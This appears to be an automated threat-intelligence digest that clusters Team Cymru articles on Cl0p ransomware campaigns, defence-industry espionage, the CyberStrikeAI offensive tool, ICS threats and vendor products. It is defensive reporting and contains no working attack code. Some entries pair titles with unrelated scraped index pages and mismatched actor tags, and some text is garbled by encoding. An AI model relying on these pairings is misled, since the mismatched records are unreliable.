Eli Woodward 5 min read August 12, 2026 Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days PART I: Operational Profile and Campaign Analysis 1. The MFT Targeting Pattern Cl0p's defining operational characteristic is a sustained and systematic focus on internet-facing applications that hold or move valuable data. Across ten known campaigns, the group has targeted Accellion FTA, SolarWinds Serv-U, Fortra GoAnywhere MFT, PaperCut MF/NG, Progress MOVEit Transfer, SysAid ITSM, Cleo MFT (Harmony, VLTrader, LexiCom), Oracle E-Business Suite, Gladinet Centrestack/TrioFox and, most recently, PTC Windchill and FlexPLM. Managed file transfer (MFT) remains the core of the pattern. The exceptions — PaperCut (print management), SysAid (IT service management), Oracle EBS (enterprise resource planning) and Windchill/FlexPLM (product lifecycle management) — share the same architectural profile: an internet-facing application that processes, stores or transfers sensitive files. Windchill sharpens the picture. PLM platforms hold engineering schematics, design data and other proprietary product information rather than the personal or health records most breach programs are built around. Cl0p's target selection is best understood through the value of the data an edge application holds, not just its product category. This consistency is significant for two reasons. First, it indicates strategic specialization rather than opportunistic exploitation: the group has invested in developing or acquiring zero-day capabilities for this class of application, deploying zero-day exploits in eight of ten campaigns. Second, it defines a bounded, defensible attack surface. Organizations that operate these platforms can identify themselves as potential targets and implement category-specific protections — a defensive advantage that is uncommon against most ransomware groups. FIGURE 1 · COMPLETE CL0P CAMPAIGN HISTORY, 2020–2026 2. Exploitation Timeline The chronological record of Cl0p campaigns reveals a distinctive operational tempo: extended dormancy periods punctuated by concentrated bursts of activity. FIGURE 2 · CAMPAIGN TIMELINE WITH INTER-CAMPAIGN INTERVALS, DEC 2020 – AUG 2026 The group's longest dormancy — approximately 14 months between the SolarWinds Serv-U exploitation in late 2021 and the Fortra GoAnywhere campaign in January 2023 — was followed by its most active phase: four campaigns across four separate technologies in ten months, three of them (GoAnywhere, PaperCut and MOVEit) in the first five months of 2023. This burst-and-pause cadence suggests a development cycle in which the group acquires or develops exploits, executes campaigns in rapid succession, and then withdraws to prepare for the next cycle. A second long pause of roughly 12 months followed SysAid before Cleo in October 2024. The first edition of this report used 10- to 14-month intervals as a rough forecasting baseline and noted, as of mid-2026, that the next cycle might be approaching. It arrived sooner than that baseline implied: Windchill exploitation began in early June 2026, about seven months after Centrestack. Taken together, Oracle EBS, Centrestack and Windchill represent three campaigns in roughly ten months — a burst comparable to 2023. FORECASTING IMPLICATION: Long dormancy periods remain characteristic of Cl0p, but they are not a safe planning assumption. The recent cycle has compressed. Defenders should treat the period immediately after a campaign as a preparation window for the next one, not a quiet period. 3. Seasonal and holiday clustering FIGURE 3 · CAMPAIGNS BY QUARTER OF INITIATION — Q4 ACCOUNTS FOR HALF OF ALL CAMPAIGNS When campaigns are mapped by calendar quarter, Q4 is the dominant operational window. Five of ten confirmed campaigns were initiated during October through December — as many as all other quarters combined. This clustering is operationally meaningful: Q4 coincides with major holidays in the United States and Europe, periods when security opera
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days
  - Published: 2026-10-22T20:14:27+00:00
  - Link: https://www.team-cymru.com/post/cl0p-ransomware-mft-attack-pattern-threat-intelligence
  - Summary: Analyze Cl0p ransomware's history of targeting MFT systems. Discover their attack pattern in threat intelligence to improve cyber attack surface reduction.

### Cluster 0be1df44fd — score 11

- Title: Webmin Vulnerability and Port Scanning Activity
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-19T14:30:25+00:00
- Link: https://www.team-cymru.com/post/webmin-vulnerability-and-port-scanning-activity
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, ransomware_extortion, supply_chain
- actor_attribution: Cl0p, ShinyHunters
- affected_industries: manufacturing_industrial
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, phishing_social_eng, apt_espionage
- actor_attribution: ShinyHunters, Cl0p
- affected_industries: manufacturing_industrial
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
Stay ahead of cyber threats with our in-depth analysis of the Webmin vulnerability and port scanning activity. Protect your technology company now!
```

#### Full body

```
Filter Topic Loading topics... Author Loading authors... Clear filters Sorted Newest first Annika Martins 3 min read From Serengeti to Serengeti III: What Three INTERPOL Operations Reveal Incident Response & Preemptive Defense October 22, 2026 INTERPOL’s Operation Serengeti has led to 3,677 arrests across three operations since 2024. What changed from Serengeti to III, and what it means for defenders. Will Thomas 3 min read LegionRelay: Ukraine Targeted by Five Previously Unidentified C2 Servers Threat Actor, Campaign & Infrastructure Intelligence October 14, 2026 See how threat hunting in Team Cymru Scout surfaced five previously unreported LegionRelay C2 servers tied to a Russia-aligned campaign targeting Ukraine. Scott Fisher 5 min read Relaying to the Frontier Threat Actor, Campaign & Infrastructure Intelligence September 22, 2026 Team Cymru uncovered self-hosted LLM gateways relaying pooled credentials to frontier models like Claude, enabling model distillation and abuse. Will Thomas 4 min read From the Disk to the Flows: Ransomware Infrastructure Analysis Malware & Ransomware Analysis September 15, 2026 A year of incident response data reveals how Akira, DragonForce & Clop build ransomware infrastructure — and how defenders can hunt it. 3 min read The Transaction Is the Last Step, Not the First Fraud, Phishing & Supply Chain Risk September 2, 2026 Waiting for the transaction to catch fraud? You're already too late. Learn how tracking attack patterns in threat intelligence stops actors early. Eli Woodward 5 min read Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days Malware & Ransomware Analysis August 12, 2026 Analyze Cl0p ransomware's history of targeting MFT systems. Discover their attack pattern in threat intelligence to improve cyber attack surface reduction. Stephen Campbell 5 min read Behind the Panels: Validating ShinyHunters Cluster A Infrastructure Through Network Telemetry Threat Actor, Campaign & Infrastructure Intelligence August 5, 2026 Use network telemetry to validate cyber threat actors' phishing infrastructure. Track ShinyHunters clusters and defend against SaaS data exfiltration. Josh Picolet 3 min read From C2 Detection to Possible Victim Identification Malware & Ransomware Analysis July 27, 2026 Discover how to transition from C2 detection to possible victim identification. Improve your cyber incident response by tracking attacker infrastructure to compromised systems. Abigail Lorion 2 min read Modernizing Incident Response: 4 Steps to Bulletproof Your Windows Logging Threat Reports & Intelligence Briefings July 14, 2026 Improve your cyber incident response steps with our guide to bulletproof Windows logging. Discover incident response tools and how AI streamlines DFIR. Abigail Lorion 4 min read min read Cybercrime Doesn't Reinvent Itself. It Optimizes. Malware & Ransomware Analysis June 29, 2026 Discover how AI threat intelligence reveals cybercriminals' true tactics. Learn why agentic AI and automated threat detection are reshaping cybersecurity. Abigail Lorion 3 min read min read The Unclosed Gap: Why the 2026 DBIR Proves the Decisive Battle Happens Before the First Internal Alert Attack Surface & Exposure Visibility May 27, 2026 The 2026 DBIR reveals 88% of threats are external. Learn how Team Cymru's Pure Signal closes the visibility gap before internal alerts trigger. Stephen Campbell 5 min read min read Targeting the Defense Industrial Base: What Network Telemetry Reveals About Nation-State Pre-Positioning Attack Surface & Exposure Visibility April 29, 2026 Discover how nation-states target the Defense Industrial Base via pre-positioning. Learn why network telemetry is crucial to detect these hidden cyber threats. Next The latest articles straight to your inbox Stay in the loop Stay current with Team Cymru insights Get the latest research, articles, and threat intelligence resources, delivered straight to your inbox. Engage with Team Cymru and the Threat Intelligence Community Connect with
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Webmin Vulnerability and Port Scanning Activity
  - Published: 2026-10-19T14:30:25+00:00
  - Link: https://www.team-cymru.com/post/webmin-vulnerability-and-port-scanning-activity
  - Summary: Stay ahead of cyber threats with our in-depth analysis of the Webmin vulnerability and port scanning activity. Protect your technology company now!

### Cluster 88364fe6d8 — score 11

- Title: Research Shows Number of Potentially Compromised Organizations More than Doubles Since January
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-19T14:30:25+00:00
- Link: https://www.team-cymru.com/post/research-shows-number-of-potentially-compromised-organizations-more-than-doubles-since-january
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, ransomware_extortion, supply_chain
- actor_attribution: Cl0p, ShinyHunters
- affected_industries: manufacturing_industrial
- content_type: incident_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, phishing_social_eng, apt_espionage
- actor_attribution: ShinyHunters, Cl0p
- affected_industries: manufacturing_industrial
- content_type: incident_report
- confidence_tier: tier_2_operator

#### Summary

```
Discover the alarming rise in compromised organizations since January. Learn how this impacts technology companies and what steps can be taken to mitigate the risks.
```

#### Full body

```
Filter Topic Loading topics... Author Loading authors... Clear filters Sorted Newest first Annika Martins 3 min read From Serengeti to Serengeti III: What Three INTERPOL Operations Reveal Incident Response & Preemptive Defense October 22, 2026 INTERPOL’s Operation Serengeti has led to 3,677 arrests across three operations since 2024. What changed from Serengeti to III, and what it means for defenders. Will Thomas 3 min read LegionRelay: Ukraine Targeted by Five Previously Unidentified C2 Servers Threat Actor, Campaign & Infrastructure Intelligence October 14, 2026 See how threat hunting in Team Cymru Scout surfaced five previously unreported LegionRelay C2 servers tied to a Russia-aligned campaign targeting Ukraine. Scott Fisher 5 min read Relaying to the Frontier Threat Actor, Campaign & Infrastructure Intelligence September 22, 2026 Team Cymru uncovered self-hosted LLM gateways relaying pooled credentials to frontier models like Claude, enabling model distillation and abuse. Will Thomas 4 min read From the Disk to the Flows: Ransomware Infrastructure Analysis Malware & Ransomware Analysis September 15, 2026 A year of incident response data reveals how Akira, DragonForce & Clop build ransomware infrastructure — and how defenders can hunt it. 3 min read The Transaction Is the Last Step, Not the First Fraud, Phishing & Supply Chain Risk September 2, 2026 Waiting for the transaction to catch fraud? You're already too late. Learn how tracking attack patterns in threat intelligence stops actors early. Eli Woodward 5 min read Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days Malware & Ransomware Analysis August 12, 2026 Analyze Cl0p ransomware's history of targeting MFT systems. Discover their attack pattern in threat intelligence to improve cyber attack surface reduction. Stephen Campbell 5 min read Behind the Panels: Validating ShinyHunters Cluster A Infrastructure Through Network Telemetry Threat Actor, Campaign & Infrastructure Intelligence August 5, 2026 Use network telemetry to validate cyber threat actors' phishing infrastructure. Track ShinyHunters clusters and defend against SaaS data exfiltration. Josh Picolet 3 min read From C2 Detection to Possible Victim Identification Malware & Ransomware Analysis July 27, 2026 Discover how to transition from C2 detection to possible victim identification. Improve your cyber incident response by tracking attacker infrastructure to compromised systems. Abigail Lorion 2 min read Modernizing Incident Response: 4 Steps to Bulletproof Your Windows Logging Threat Reports & Intelligence Briefings July 14, 2026 Improve your cyber incident response steps with our guide to bulletproof Windows logging. Discover incident response tools and how AI streamlines DFIR. Abigail Lorion 4 min read min read Cybercrime Doesn't Reinvent Itself. It Optimizes. Malware & Ransomware Analysis June 29, 2026 Discover how AI threat intelligence reveals cybercriminals' true tactics. Learn why agentic AI and automated threat detection are reshaping cybersecurity. Abigail Lorion 3 min read min read The Unclosed Gap: Why the 2026 DBIR Proves the Decisive Battle Happens Before the First Internal Alert Attack Surface & Exposure Visibility May 27, 2026 The 2026 DBIR reveals 88% of threats are external. Learn how Team Cymru's Pure Signal closes the visibility gap before internal alerts trigger. Stephen Campbell 5 min read min read Targeting the Defense Industrial Base: What Network Telemetry Reveals About Nation-State Pre-Positioning Attack Surface & Exposure Visibility April 29, 2026 Discover how nation-states target the Defense Industrial Base via pre-positioning. Learn why network telemetry is crucial to detect these hidden cyber threats. Next The latest articles straight to your inbox Stay in the loop Stay current with Team Cymru insights Get the latest research, articles, and threat intelligence resources, delivered straight to your inbox. Engage with Team Cymru and the Threat Intelligence Community Connect with
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Research Shows Number of Potentially Compromised Organizations More than Doubles Since January
  - Published: 2026-10-19T14:30:25+00:00
  - Link: https://www.team-cymru.com/post/research-shows-number-of-potentially-compromised-organizations-more-than-doubles-since-january
  - Summary: Discover the alarming rise in compromised organizations since January. Learn how this impacts technology companies and what steps can be taken to mitigate the risks.

### Cluster b9771fe2d2 — score 11

- Title: Targeting the Defense Industrial Base: What Network Telemetry Reveals About Nation-State Pre-Positioning
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-19T14:07:29+00:00
- Link: https://www.team-cymru.com/post/defense-industrial-base-nation-state-network-telemetry
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, supply_chain
- actor_attribution: Salt Typhoon, Volt Typhoon
- affected_industries: critical_infrastructure, manufacturing_industrial
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain, apt_espionage
- actor_attribution: Volt Typhoon, Salt Typhoon
- affected_industries: critical_infrastructure, manufacturing_industrial
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Discover how nation-states target the Defense Industrial Base via pre-positioning. Learn why network telemetry is crucial to detect these hidden cyber threats.
```

#### Full body

```
Stephen Campbell 5 min read min read April 29, 2026 Targeting the Defense Industrial Base: What Network Telemetry Reveals About Nation-State Pre-Positioning Intelligence drives operations. It provides commanders with options across time and space and enables them to shape the battlefield on their terms. This concept is not new. What has changed is the domain. Nation states are applying the same intelligence playbook in cyberspace, with the Defense Industrial Base as a primary target. What is being observed is not limited to intrusion activity, it is reconnaissance and pre positioning. Analysis of large-scale network telemetry reinforces this, showing sustained patterns of infrastructure mapping and access development long before disruptive activity occurs. In MITRE ATT&CK terms, this maps directly to reconnaissance and resource development. Adversaries are identifying targets, mapping infrastructure, and preparing access long before anything disruptive happens. Volt Typhoon is a clear example. They maintained access to US critical infrastructure for over five years before it was publicly disclosed. This is not an attack. It is intelligence preparation of the battlefield, carried out in cyberspace. Why the DIB is the Target The Defense Industrial Base is one of the most targeted sectors out there, and it is not just about stealing data. Yes, intellectual property matters. Weapons systems, propulsion, and communications technology are all high value targets. Stealing that information shortens the development and learning curve. It lets adversaries bypass years of research and development and move faster than they should be able to. But the real objective is access. If you can disrupt or degrade a supply chain at the right moment, that creates strategic impact. In a crisis, that is far more valuable than large volumes of stolen data. When most people think about the Defense Industrial Base, they picture large primes like Raytheon or Northrop Grumman. The reality is very different. Around 80 percent of the DIB is made up of small and mid-size contractors. These companies hold sensitive data. Contracts, technical specifications, and personnel information tied to clearances. But many of them are not resourced to defend at the same level as the primes. There is a mismatch between what they hold and what they can protect. That gap is what adversaries exploit. In military terms, you avoid the strongest point and look for the gap. The seam. The place where defenses are thin, and access still gets you where you need to go. In cyber, that seam is often a smaller contractor with real access and limited defenses. Four Actors, Four Approaches Understanding who is targeting the DIB and how they operate is key to building any effective defense. China operates with patience and persistence. Groups like Volt Typhoon and Salt Typhoon are not built for speed. They are built to remain hidden. Volt Typhoon relies heavily on living off the land techniques . That means using tools that already exist inside the environment, like PowerShell and WMI, instead of deploying custom malware. Nothing new gets dropped, nothing obvious gets flagged. Their activity blends into normal system operations, which makes detection extremely difficult. Salt Typhoon showed how far this approach can go . In 2024, they compromised the US Army National Guard network and maintained access for nine months. During that time, they collected network diagrams and administrator credentials. This is not random collection. It is deliberate. They are mapping the environment, understanding how it is built, and identifying where they can move next or come back later. It is about positioning, not immediate impact. Russia takes a more aggressive infrastructure-focused approach. GRU Unit 26165 has been exploiting vulnerable edge routers at scale. Instead of just gaining access to one network, they turn these devices into relay nodes. Traffic is redirected through attacker controlled DNS in
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Targeting the Defense Industrial Base: What Network Telemetry Reveals About Nation-State Pre-Positioning
  - Published: 2026-10-19T14:07:29+00:00
  - Link: https://www.team-cymru.com/post/defense-industrial-base-nation-state-network-telemetry
  - Summary: Discover how nation-states target the Defense Industrial Base via pre-positioning. Learn why network telemetry is crucial to detect these hidden cyber threats.

### Cluster 7bab174bc9 — score 11

- Title: Tracking CyberStrikeAI Usage
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-19T14:07:29+00:00
- Link: https://www.team-cymru.com/post/tracking-cyberstrikeai-usage
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage
- affected_industries: government
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: apt_espionage
- affected_industries: government
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Discover how CyberStrikeAI is revolutionizing AI-augmented offensive security. Explore its ties to Chinese state-sponsored actors and learn to detect it with NetFlow.
```

#### Full body

```
Will Thomas 5 min read March 2, 2026 Tracking CyberStrikeAI Usage Team Cymru is continuously monitoring our global netflow visibility to uncover patterns of adversary activity, identify malicious operations, and gain actionable intelligence. In this post, we are diving into CyberStrikeAI, an open-source artificial intelligence (AI) offensive security tool (OST) developed by a China-based developer who we assess has some ties to the Chinese government. What is CyberStrikeAI? In its own words from the GitHub repository (see here ), ‚ÄúCyberStrikeAI is an AI-native security testing platform built in Go. It integrates 100+ security tools, an intelligent orchestration engine, role-based testing with predefined security roles, a skills system with specialized testing skills, and comprehensive lifecycle management capabilities.‚Äù CyberStrikeAI comes with its own dashboard that helps users quickly understand the platform's core features and current state, as shown in Figure 1 below. Figure 1: CyberStrikeAI Dashboard from GitHub CyberStrikeAI was first brought to our attention following the Amazon CTI team‚Äôs blog about AI-augmented threat actor infrastructure they had discovered. Amazon shared this related IP 212.11.64[.]250. Analysis of that IP address in Team Cymru Scout‚Äôs open port scan data revealed that it had this ‚ÄúCyberStrikeAI‚Äù banner running on this service, as shown in Figure 2 below. Figure 2: The CyberStrikeAI port banner in Team Cymru Scout. Identifying Targeting with NetFlow Using Team Cymru Scout, we can find NetFlow communications between the IP shared by Amazon and its targets, such as the Fortinet FortiGate devices it was observed targeting, as shown in Figure 3 below. Figure 3. IP address running CyberStrikeAI targeting a Fortinet FortiGate device. Researching Ed1s0nZ While researching the GitHub profile (see here ) of CyberStrikeAI‚Äôs developer, ‚ÄúEd1s0nZ‚Äù, several attributes about the individual caught our attention. Firstly, Ed1s0nZ‚Äôs other GitHub repositories suggest interest in exploitation activity: watermark-tool: A secure and efficient invisible document watermarking solution that can add completely invisible digital watermarks to various documents, while supporting watermark extraction and verification. Developed in Go, it supports both web and CLI usage. The watermark uses steganography technology to ensure that the watermark is completely invisible and does not affect the reading experience and visual effects of the original document. PrivHunterAI: This tool uses a passive proxy approach and mainstream AI (such as Kimi, DeepSeek, GPT, etc.) to detect privilege escalation vulnerabilities. Its core detection function is built on the open APIs of the relevant AI engines and supports data transmission and interaction via HTTPS protocol. InfiltrateX: A useful privilege escalation scanning tool. While automated detection of privilege escalation vulnerabilities is difficult, prone to occur, and poses serious risks, it can still strive to automate the detection of some such vulnerabilities. Further, Ed1s0nZ‚Äôs GitHub activities indicate they interact with organisations that support potentially Chinese government state-sponsored cyber operations. This includes Chinese private sector firms that have known ties to the Chinese Ministry of State Security (MSS). A number of GitHub activities potentially link Ed1s0nZ to the Chinese state-sponsored cyber operations. On 19 December 2025, Ed1s0nZ posted CyberStrikeAI to Knownsec 404‚Äôs Starlink Project, as shown in Figure 4 below. Based on published reporting by DomainTools and others, Knownsec does work for the MSS and the Chinese People‚Äôs Liberation Army (PLA). Figure 4. Ed1s0nZ‚Äôs post sharing CyberStrikeAI to Knownsec 404‚Äôs Starlink Project. Further, on 5 January 2026, Ed1s0nZ added to their GitHub profile ‚ÄúCNNVDÔºàÂõΩÂÆ∂‰ø°ÊÅØÂÆâÂÖ®ÊºèÊ¥ûÔºâ 2024 Âπ¥Â∫¶ÊºèÊ¥ûÂ•ñÂä±ËÆ°Âàí ¬∑ ‰∫åÁ∫ßË¥°ÁåÆÂ•ñÔºà‰∏™‰∫∫). Translation: CNNVD (Chinese National Vulnerab
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Tracking CyberStrikeAI Usage
  - Published: 2026-10-19T14:07:29+00:00
  - Link: https://www.team-cymru.com/post/tracking-cyberstrikeai-usage
  - Summary: Discover how CyberStrikeAI is revolutionizing AI-augmented offensive security. Explore its ties to Chinese state-sponsored actors and learn to detect it with NetFlow.

### Cluster f7ce25a96b — score 11

- Title: Protecting Critical National Infrastructure (CNI) through extended global visibility
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-19T14:07:29+00:00
- Link: https://www.team-cymru.com/post/protecting-critical-national-infrastructure-orb-networks
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage
- affected_industries: critical_infrastructure, manufacturing_industrial
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: apt_espionage
- affected_industries: critical_infrastructure, manufacturing_industrial
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Adversaries are pre-positioning for destructive attacks on CNI. Learn how to track nation-state threat actors and ORB networks to harden the OT boundary "left of boom."
```

#### Full body

```
4 min read February 17, 2026 Protecting Critical National Infrastructure (CNI) through extended global visibility Team Cymru offers a range of capabilities specifically tailored to protect Industrial Control Systems (ICS) and Operational Technology (OT), which over the years have been increasingly targeted by hostile nation-state threat actors as well as lesser skilled ‚Äúhacktivist‚Äù groups. Unlike standard IT environments, OT systems often utilize legacy protocols and have long equipment lifecycles, making proactive external visibility essential. By focusing on the networking stages of the ICS version of the MITRE ATT&CK framework using Team Cymru‚Äôs visibility, specifically Reconnaissance and Command and Control, OT defenders can identify scanning and exploitation attempts against exposed infrastructure and track malicious infrastructure before attackers can establish persistence. Cybersecurity industry experts continue to warn that critical national infrastructure (CNI) sector organizations need to enhance their visibility into their own remote facilities and technical OT system. "Utilities need to treat external exposure and asset blind spots as intelligence problems, not just configuration issues. Energy-sector OT environments are becoming increasingly exposed as legacy systems connect to modern networks without corresponding gains in visibility or monitoring. What stands out in these findings is how quickly serious risks emerge once traffic is observed, suggesting attackers are likely identifying the same weaknesses just as fast. Closing these gaps requires continuous visibility into OT communications and the context to understand what ‚Äònormal‚Äô behavior actually looks like.‚Äù - Will Baxter, Field CISO at Team Cymru. "The recent Poland attacks confirmed that the adversary doesn't just teleport to the perimeter; they 'commute' via Operational Relay Boxes (ORBs) to pre-position themselves months in advance. Tracking this external infrastructure allows defenders to spot the threat left of boom, burning the adversary's bridge before they can cross it to deliver kinetic effects. To survive a sophisticated campaign, we cannot operate with blind spots; we need external telemetry to track the adversary's intent and internal deep-packet inspection to catch their specific 'living off the land' tactics. External visibility tells you who is knocking at the gate, while internal visibility is the only way to see what physical process they are attempting to disrupt once inside and capturing transient data for root cause analysis afterwards." - Mark (Magpie) Graham of Dragos Inc. Evolutions of the ICS and OT Threat Landscape in 2025 To help track the evolution of ICS/OT threats, Team Cymru researchers supported the development of the Cyber Incident Tracker for Electric Power Systems (CITEPS), a project created by Prof. Dr. Luiz F. Freitas-Gutierres. The evolution of ICT/OT threats can be marked by two main eras. The first era involves adversaries experimenting with these sophisticated digital weapons. The second era can be marked by an increasing usage and adoption of these capabilities by adversaries, often attributed to nation-state intelligence services. 2010‚Äì2019: The Era of Experimentation This period marked the introduction of specialized digital weapons targeting ICS, leading to a mix of espionage and destructive attacks. This includes the deployment of Stuxnet in 2010, which is noted as the world‚Äôs first publicly known digital weapon against ICS, physically destroying centrifuges at the Natanz nuclear facility in Iran. Subsequent malware became more specialized, such as Industroyer which was used in the 2016 Ukraine power grid attack to disrupt electricity, a critical event that signaled a shift toward direct grid manipulation. The ceiling was raised further in 2017 with Triton malware, which specifically targeted safety instrumented systems at a Saudi Arabian petrochemical plant, threatening physical safety mechanism
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Protecting Critical National Infrastructure (CNI) through extended global visibility
  - Published: 2026-10-19T14:07:29+00:00
  - Link: https://www.team-cymru.com/post/protecting-critical-national-infrastructure-orb-networks
  - Summary: Adversaries are pre-positioning for destructive attacks on CNI. Learn how to track nation-state threat actors and ORB networks to harden the OT boundary "left of boom."

### Cluster 498d32f5a8 — score 11

- Title: RADAR Takes the Guess Work Out of Vulnerability Exposure Management
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-19T14:07:29+00:00
- Link: https://www.team-cymru.com/post/radar-takes-the-guess-work-out-of-vulnerability-exposure-management
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ransomware_extortion
- urgency_signals: actively_exploited, no_patch_yet
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, active_exploitation
- urgency_signals: actively_exploited, no_patch_yet
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
Stop manual asset inventory. RADAR automatically discovers all internet-facing infrastructure and filters for CISA KEVs within seconds. Get a prioritized, actionable list of risks. Learn how.
```

#### Full body

```
Jeremy Bender 1 min read December 4, 2025 RADAR Takes the Guess Work Out of Vulnerability Exposure Management Identifying critical vulnerabilities in exposed, internet-facing systems is essential for security—it can also be extremely time intensive. Maintaining an accurate list of organization-wide assets can be difficult enough as is, without even getting into the challenge of shadow IT, cloud sprawl, or third-party assets you may not even know exist. Even once assets are fully inventoried, you still need to identify running processes and potential vulnerabilities for remediation. Is it really any wonder, with all the steps involved, that mistakes happen and vulnerabilities can remain unpatched? RADAR takes all the guesswork out of vulnerability exposure assessments. With a simple search, RADAR discovers all internet-facing infrastructure linked to the provided domains. Within seconds, you can use this to deliver a list of domain-linked IPs containing known exploited vulnerabilities (KEVs). How RADAR Exposes Vulnerabilities In RADAR, enter a top-level domain, or series of linked domains. RADAR will automatically pull in all associated internet-facing IPs, domains, and CIDR ranges. Within RADAR, you can then specifically view associated IPs discovered through the search. RADAR will automatically enrich each listed IP with any CVEs using CISA’s live database. The enriched CVE information will contain the CVE number, description, and when the CVE was first and last seen. For more granular information, you can also apply filters, including filtering KEVs. This automatically reduces the asset list to just those containing verified risks currently being exploited in the wild. You can then further filter out CDNs or shared hosts, leading to a clear prioritized list of assets you directly manage. Within seconds, RADAR can make a clear, actionable list of assets for vulnerability teams to focus on for remediation. How to Access RADAR Through January 31, 2026, all existing Team Cymru Recon or Scout customers have complimentary RADAR access. For those interested in testing RADAR without current access, visit go.team-cymru.com/puresignal-radar to see what makes RADAR and Team Cymru’s PureSignal™ data so unique. ‍ Pure Signal™ Command Take the next hunt into Command. Search, pivot, and act on internet infrastructure in one AI-assisted environment, built on visibility into 400B+ daily connections. Get an Analyst-Led Walkthrough → Pure Signal™ Command Take the next hunt into Command. Search, pivot, and act on internet infrastructure in one AI-assisted environment, built on visibility into 400B+ daily connections. Get an Analyst-Led Walkthrough → Copy Link The latest articles straight to your inbox Related Posts Annika Martins 3 min read From Serengeti to Serengeti III: What Three INTERPOL Operations Reveal Will Thomas 3 min read LegionRelay: Ukraine Targeted by Five Previously Unidentified C2 Servers Scott Fisher 5 min read Relaying to the Frontier Will Thomas 4 min read From the Disk to the Flows: Ransomware Infrastructure Analysis
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: RADAR Takes the Guess Work Out of Vulnerability Exposure Management
  - Published: 2026-10-19T14:07:29+00:00
  - Link: https://www.team-cymru.com/post/radar-takes-the-guess-work-out-of-vulnerability-exposure-management
  - Summary: Stop manual asset inventory. RADAR automatically discovers all internet-facing infrastructure and filters for CISA KEVs within seconds. Get a prioritized, actionable list of risks. Learn how.

### Cluster ffad5d9316 — score 11

- Title: Threat Intelligence: A CISO ROI Guide - Prevent Data Breaches
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-19T14:07:29+00:00
- Link: https://www.team-cymru.com/post/threat-intelligence-a-ciso-roi-guide-prevent-data-breaches
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, supply_chain
- affected_industries: retail_ecommerce
- content_type: incident_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain, data_breach
- affected_industries: retail_ecommerce
- content_type: incident_report
- confidence_tier: tier_2_operator

#### Summary

```
Uncover the power of threat intelligence for a technology company. Learn how to prevent data breaches and maximize ROI as a CISO with expert guidance.
```

#### Full body

```
tcblogposts 4 min read March 15, 2023 Threat Intelligence: A CISO ROI Guide - Prevent Data Breaches Threat Reconnaissance that Saves your Butt and the Budget Threat hunting and reconnaissance often seems like another hard to explain cybersecurity budget item, especially when talking to business counterparts. As a CISO, you know that having an elite team of threat hunters focused on your external attack surface saves the company from a compromise or attack. External threat hunters have the visibility to monitor threat actor infrastructure, see how it evolves, and shut down any communication going to hackers. You know how important this capability is to safeguard the organization, but how about the rest of the company? Spoiler alert: over the next five parts of this series, we‚Äôre going to explain in simple terms how an elite group of threat hunters using Pure Signal Recon were able to effect a total $9m in savings. This threat hunting team supported cybersecurity needs for key business initiatives and helped their company realize a three year risk reduction savings of $9m. Half of the $9m in savings can be attributed to avoiding a data breach in the first place, so let‚Äôs start our discussion with the biggest area of cost savings and risk reduction. We‚Äôll start where the largest savings were found, with $4.5m of the $9m being attributed to data breach avoidance. Data Breaches - Proactive Approach for Payback As a real world example we are going to examine the hard dollars that a large multinational retailer saved with their investment in Pure Signal Recon to empower their analysts with unmatched threat hunting and reconnaissance capabilities. This is a company with a mature cybersecurity team that provides cybersecurity defenses to 